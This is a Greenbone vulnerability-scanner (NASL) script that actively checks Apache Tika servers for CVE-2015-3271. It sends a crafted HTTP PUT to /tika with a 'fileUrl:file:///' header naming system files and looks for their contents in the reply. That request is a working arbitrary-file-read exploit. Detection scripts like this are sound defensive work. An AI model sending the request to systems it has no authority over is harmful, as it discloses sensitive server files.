# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:tika";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.810252");
  script_version("2025-08-22T05:39:46+0000");
  script_tag(name:"last_modification", value:"2025-08-22 05:39:46 +0000 (Fri, 22 Aug 2025)");
  script_tag(name:"creation_date", value:"2016-12-20 17:03:54 +0530 (Tue, 20 Dec 2016)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-12-23 02:59:00 +0000 (Fri, 23 Dec 2016)");

  script_cve_id("CVE-2015-3271");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Apache Tika < 1.10 Information Disclosure Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_apache_tika_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("apache/tika/http/detected");
  script_require_ports("Services/www", 9998);

  script_tag(name:"summary", value:"Apache Tika is prone to an information disclosure
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP PUT request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to it provides optional functionality to run
  itself as a web service to allow remote use. When used in this manner, it is possible for a 3rd
  party to pass a 'fileUrl' header to the Apache Tika Server (tika-server).");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote attacker to read
  arbitrary files, this could be used to return sensitive content from the server machine.");

  script_tag(name:"affected", value:"Apache Tika version 1.9.");

  script_tag(name:"solution", value:"Update to version 1.10 or later.");

  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2015/q3/350");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/9502");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-3271");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/08/13/5");


  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("os_func.inc");
include("traversal_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = "/tika";

files = traversal_files();

useragent = http_get_user_agent();
host = http_host_name(port: port);

foreach pattern (keys(files)) {
  req = 'PUT ' + url + ' HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/plain\r\n' +
        'fileUrl:file:///' + files[pattern] + '\r\n\r\n';

  res = http_keepalive_send_recv(port: port, data: req);

  if (egrep(pattern: pattern, string: res)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
